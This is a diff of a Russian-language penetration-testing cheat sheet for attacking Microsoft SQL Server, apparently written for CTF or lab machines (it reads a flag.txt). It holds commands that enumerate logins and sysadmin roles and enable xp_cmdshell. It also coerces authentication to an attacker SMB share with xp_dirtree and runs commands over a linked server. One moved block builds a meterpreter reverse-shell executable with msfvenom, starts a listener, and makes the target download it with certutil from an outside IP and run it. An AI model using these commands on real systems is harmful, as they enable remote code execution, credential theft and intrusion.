@@ -115,12 +115,10 @@ export KRB5CCNAME=sqlsvc.ccache
 * Перечисление входов в систему (сервера) - Проверить залогиненных пользователей
 
       enum_logins                - enum login users
-      SELECT r.name, r.type_desc, r.is_disabled, sl.sysadmin, sl.securityadmin, sl.serveradmin, sl.setupadmin, sl.processadmin, sl.diskadmin, sl.dbcreator, sl.bulkadmin
-        FROM master.sys.server_principals r
-        LEFT JOIN master.sys.syslogins sl ON sl.sid = r.sid
-        WHERE r.type IN ('S','E','X','U','G');
 
-  * Перечисление баз данных
+       SELECT r.name, r.type_desc, r.is_disabled, sl.sysadmin, sl.securityadmin, sl.serveradmin, sl.setupadmin, sl.processadmin, sl.diskadmin, sl.dbcreator, sl.bulkadmin FROM master.sys.server_principals r LEFT JOIN master.sys.syslogins sl ON sl.sid = r.sid WHERE r.type IN ('S','E','X','U','G');
+
+ * Перечисление баз данных
 
           enum_db
            USE flagDB;
@@ -132,27 +130,22 @@ export KRB5CCNAME=sqlsvc.ccache
 * Перечисление пользователей (базы данных)
   
       USE webshop;
-        EXECUTE sp_helpuser;
+      EXECUTE sp_helpuser;
 
-       use webshop
+      use webshop
       enum_users
         
----Включить вполнени xp_cmdshell
+* Включить вполнени xp_cmdshell
 
-enable_xp_cmdshell
+        enable_xp_cmdshell
 
-reconfigure
+        reconfigure
 
-xp_cmdshell
+        xp_cmdshell
 
-xp_dirtree "\\10.10.14.42\sass"  --- перейти по адресу с аутентификацией
+        xp_dirtree "\\10.10.14.42\sass"  --- перейти по адресу с аутентификацией
 
-exec xp_dirtree 'c:/';
-
-********************
-   
-      
-
+        exec xp_dirtree 'c:/';
 
 * Проверим, у кого есть роль sysadmin
 
@@ -174,6 +167,7 @@ exec xp_dirtree 'c:/';
 * Давайте проверим наличие локального связанного сервера
 
       SELECT srvname, isremote FROM sysservers
+
   мы его нашли и
 
       EXEC ('sp_configure ''show advanced options'', 1') AT [LOCAL.TEST.LINKED.SRV]
@@ -182,6 +176,17 @@ exec xp_dirtree 'c:/';
         EXEC ('RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV]
           EXEC ('xp_cmdshell ''whoami''') AT [LOCAL.TEST.LINKED.SRV]
       EXEC ('xp_cmdshell ''type C:\Users\Administrator\Desktop\flag.txt''') AT [LOCAL.TEST.LINKED.SRV]
+
+    enum_links                 - enum linked servers
+                                                                   
+         use_link "DC02.darkzero.ext"
+         enable_xp_cmdshell
+         msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4242 -f exe -o s.exe
+         msfconsole -x "use exploits/multi/handler; set lhost tun0; set lport 4242; set payload windows/x64/meterpreter/reverse_tcp; exploit"
+         python3 -m http.server 4243
+         xp_cmdshell "certutil -urlcache -f http://10.10.16.28:4243/s.exe %TEMP%/s.exe"
+         xp_cmdshell "start %TEMP%/s.exe"
+
 ***************************************************************************************
        select name from sys.databases;  (перечислить все базы данных)
 
@@ -193,16 +198,8 @@ exec xp_dirtree 'c:/';
 
         describe wp_users; (описать таблицу)
 
-это интересно!!!  ПЕРЕЧИСЛЕНИЕ СВЯЗАННХ СЕРВЕРОВ                    
-                                                                    enum_links                 - enum linked servers
-                                                                   
-                                                                    use_link "DC02.darkzero.ext"
-                                                                    enable_xp_cmdshell
-                                                                    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4242 -f exe -o s.exe
-                                                                    msfconsole -x "use exploits/multi/handler; set lhost tun0; set lport 4242; set payload windows/x64/meterpreter/reverse_tcp; exploit"
-                                                                    python3 -m http.server 4243
-                                                                    xp_cmdshell "certutil -urlcache -f http://10.10.16.28:4243/s.exe %TEMP%/s.exe"
-                                                                    xp_cmdshell "start %TEMP%/s.exe"
+                 
+                                                                    
                                                                             
 
 
